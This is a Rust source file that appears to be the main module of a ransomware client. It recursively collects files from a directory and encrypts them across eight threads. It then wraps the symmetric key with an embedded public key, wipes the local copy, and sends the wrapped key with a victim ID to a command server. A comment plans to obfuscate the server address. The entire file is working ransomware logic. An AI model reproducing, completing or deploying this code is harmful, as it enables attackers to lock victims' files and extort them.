use comms::{generate_ucid, Message};
use filesystem::recurse_directory_with_channel;
use openssl::ec;
use std::path::PathBuf;
use std::thread::sleep;
use std::time::Duration;
use std::vec::Vec;
use tokio::net::TcpSocket;

use zeroize::Zeroize;

mod comms;
mod encryptor;
mod filesystem;

const THREADS: i32 = 8;
// todo obfuscate this value (encrypt with server private key?)
const SERVER_IP: &'static str = "127.0.0.1:4200";

#[allow(dead_code)]
#[cfg(unix)]
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[allow(dead_code)]
#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

#[tokio::main]
async fn main() {
    let mut key = encryptor::generate_key();
    let (s, r) = crossbeam_channel::unbounded();

    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);

    let mut threads = Vec::new();

    for _ in 0..THREADS {
        let thread_reciever = r.clone();
        let thread_key = key.clone();
        threads.push(tokio::spawn(async move {
            encryptor::encrypt_files(thread_reciever, thread_key).await;
        }));
    }

    for thread in threads {
        let _ = thread.await;
    }

    let ecc_key = ec::EcKey::public_key_from_pem(PUB_KEY).unwrap();
    let p_key = openssl::pkey::PKey::from_ec_key(ecc_key).unwrap();
    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
    let buffer_len = encryptor.encrypt_len(&key).unwrap();
    let mut encrypted = vec![0u8; buffer_len];

    // Encrypt the data and discard its length
    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();

    let mut ucid = generate_ucid().unwrap();

    key.zeroize(); // zero out key, not needed anymore

    let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();

    let addr = SERVER_IP.parse().unwrap();

    let socket = TcpSocket::new_v4().unwrap();
    let stream = socket.connect(addr).await.unwrap();
    let mut read_buff = vec![0; 1024];

    loop {
        if stream.writable().await.is_ok() {
            let len = stream.try_write(&register_blob);
            if len.is_err() {
                // try immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                println!(
                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                continue;
            }
        }

        if stream.readable().await.is_ok() {
            let len = stream.try_read(&mut read_buff);

            if len.is_err() {
                // try immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                println!(
                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                continue;
            }

            let len = len.unwrap(); // len is valid, it's safe to unwrap

            match Message::from_req(&mut read_buff[0..len]) {
                Message::UcidReject(_) => {
                    ucid = generate_ucid().unwrap();
                    register_blob =
                        comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
                }
                Message::RateReject() => {
                    println!(
                    "Connection dropped by server. Response was rate limit, retrying after 30 seconds."
                );
                    sleep(Duration::from_secs(31));
                    continue;
                }
                Message::Accepted(_) => {
                    println!("Transmission successful, client exiting...");
                    break;
                }
                _ => {
                    continue;
                }
            }
        }
    }
}
